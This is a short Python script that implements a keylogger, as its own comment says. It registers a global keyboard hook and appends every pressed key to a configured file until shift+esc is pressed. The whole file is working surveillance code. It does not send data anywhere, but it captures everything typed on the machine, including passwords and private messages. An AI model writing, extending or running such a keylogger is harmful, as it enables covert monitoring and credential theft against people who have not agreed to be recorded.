import settings
import keyboard
import sys
from time import sleep
from colorama import init
import messaging

init(autoreset=True)

def get_mode():
    return settings.MODE

def get_os():
    import platform
    return platform.uname()[0]

def file_write(event):
    """ writes to a file
    """
    try:
        with open(settings.FILE_TARGET, "a") as f:
            f.write(event.name)
    except FileNotFoundError:
        messaging.error("Unindentified logger file, please enter a valid file type.")
    except:
        import traceback
        traceback.print_exc()

def on_press():
    """ Returns a callback function for the
        defined mode when key is pressed
    """
    return {
        "f": file_write
    }[get_mode()]

def listen():
    """ Listens for a keypress and calls on press 
    """
    def call_listener():
        while 1: # keeps the keylogger running
            if keyboard.is_pressed('shift+esc'):
                messaging.info("Exit keys called")
                sys.exit(0)
    function = on_press()
    keyboard.on_press(function) # Adds a listener to get chars
    call_listener()

listen()